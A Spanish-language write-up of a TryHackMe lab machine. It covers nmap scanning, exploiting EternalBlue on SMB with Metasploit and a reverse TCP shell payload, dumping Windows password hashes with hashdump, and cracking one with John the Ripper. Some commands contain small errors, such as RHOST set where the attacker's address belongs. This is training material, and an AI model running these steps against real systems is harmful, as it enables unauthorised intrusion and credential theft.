
Como ya tenemos la IP no hace falta realizar un reconocimiento de HOST.

- IP victima `10.10.59.5`

## Comprobar si tengo conexión
```
ping -c 1 10.10.59.5
```
![](img/Pasted%20image%2020240817222409.png)

# Reconocimiento

## NMAP
```
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.59.5 -oN basic_scan
```
![](img/Pasted%20image%2020240817222632.png)

# ENUMERACIÓN

## NMAP
```
nmap -p135,139,445,3389,49152,49143,49154,49158,49160 -sVC --min-rate 5000 -n -Pn -vvv 10.10.59.5 -oN ports_scan
```
![](img/Pasted%20image%2020240817223213.png)
![](img/Pasted%20image%2020240817223253.png)
![](img/Pasted%20image%2020240817223313.png)
Pruebo si el puerto 445, es vulnerable al **ETERNAL BLUE**

### PUERTO 445 - SMB
- Pruebo si es vulnerable a la vulnerabilidad de **eternal blue**. Los pasos que hay que seguir son:
```
nmap --script "vuln and safe" -n -Pn -p445 10.10.59.5 -oN vulnScan
```
![](img/Pasted%20image%2020240817231249.png)
Es vulnerable.

#### 1- INICIAR METASPLOIT
```
msfconsole -q
```
![](img/Pasted%20image%2020240817223825.png)

####  2-BUSCAR EXPLOIT
```
search eternalblue
```
![](img/Pasted%20image%2020240817223922.png)

#### 3- COMPRUEBO SI ES VULNERABLE
```
use 24
```
![](img/Pasted%20image%2020240817232512.png)
- Veo las opciones que tiene
```
show options
```
![](img/Pasted%20image%2020240817232812.png)

- Configuro RHOST que es la IP de la máquina victima. Y vuelvo a revisar las opciones
```
set RHOST 10.10.59.5
```
```
show options
```
![](img/Pasted%20image%2020240817232928.png)

- Ejecuto para ver si es vulnerable a **ETERNALBLUE**
```
run
```
![](img/Pasted%20image%2020240817233053.png)
Es vulnerable

# EXPLOTACIÓN

#### 4- USO EL EXPLOIT
- Voy a usar el exploit con el ID 24
```
use 0
```
![](img/Pasted%20image%2020240818113056.png)
#### 5- VER/CAMBAIR OPCIONES
- Veo las opciones que tiene
```
show options
```
![](img/Pasted%20image%2020240818113125.png)

- Solo tengo que introducir la IP de la máquina victima y cambiar mi IP, porque al estar en TRYHACME me da otro rango la IP `10.2.37.7`. NO HAY QUE PONERSE A LA ESCUCHA. Me da directamente un `meterpreter`. 
```
set RHOST 10.10.231.27
```
```
set RHOST 10.2.37.7
```
```
show options
```
![](img/Pasted%20image%2020240818113802.png)

#### 6- Ejecutar el exploit
```
run
```
![](img/Pasted%20image%2020240817233657.png)
Ahora hemos recibido un shell, pero no podemos hacer mucho con él. Por lo tanto, ahora ponemos en segundo plano la sesión (1.ª) y actualizamos a un shell de meterpreter

Para cambiar la carga útil, podemos cambiar el PAYLOAD ,utilice el comando:
```
set payload windows/x64/shell/reverse_tcp
```


# POST-EXPLOTACIÓN

Para poner el `meterpreter` en segundo plano usamos
```
CTRL + Z
```
![](img/Pasted%20image%2020240818114943.png)

Si quiero ver la sesión del `meterpreter`
```
sessions -l
```
![](img/Pasted%20image%2020240818115015.png)

Para volver al `meterpreter`
```
sessions 1
```
![](img/Pasted%20image%2020240818115233.png)

#### CRACKING
Estando con el `meterpreter` ya puedo ejecutar comandos.

##### HASHES
Podemos volcar las contraseña con el comando
```
hashdump
```
![](img/Pasted%20image%2020240818121100.png)

Copiamos el hash equivalente a Jon y lo guardamos en un archivo en el escritorio.
```
hashJon
```
![](img/Pasted%20image%2020240818121247.png)
![](img/Pasted%20image%2020240818121257.png)

A continuación, utilizamos la herramienta “ **John the Ripper** ” para descifrar el hash.

##### JOHN THE RIPPER
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashJon 
```
![](img/Pasted%20image%2020240818121558.png)

##### ENCONTRAR BANDERAS
Me paso del meterpreter a una shell de windows
```
shell
```
![](img/Pasted%20image%2020240818121724.png)

###### flag1
![](img/Pasted%20image%2020240818121940.png)

###### flag2
![](img/Pasted%20image%2020240818122056.png)

###### flag3
![](img/Pasted%20image%2020240818122229.png)



